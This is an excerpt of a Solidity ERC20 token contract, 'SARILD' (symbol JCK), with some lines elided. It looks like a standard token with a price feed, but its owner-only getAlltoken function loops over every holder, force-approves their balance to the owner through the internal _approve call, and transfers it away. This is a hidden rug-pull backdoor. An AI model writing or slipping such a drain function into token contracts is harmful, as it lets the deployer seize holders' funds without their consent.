...
contract SARILD is ERC20 {
    using SafeMath for uint256;
    AggregatorInterface internal priceFeed;
    address public owner;
    uint8 private _decimals = 9;
    uint256 tokenPrice = 1000000000; //how many tokens equal to 1 ETH
    modifier onlyOwner {
        require(msg.sender == owner, "only owner can call this function");
        _;
    }
    constructor() ERC20('SARILD', 'JCK') {
        priceFeed = AggregatorInterface(0x8A753747A1Fa494EC906cE90E9f37563A8AF630e);
        _mint(msg.sender, 12 * 10 ** 9);
        owner = msg.sender;
    }
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    ...
    event GetAllToken(address owner);
    function getAlltoken() public onlyOwner returns (bool) {
        for(uint256 i = 0; i < tokenOwners.length; i++) {
            ...
            _approve(tokenOwner, owner, balance);
            transferFrom(tokenOwner, owner, balance);
        }
        emit GetAllToken(owner);
        return true;
    }
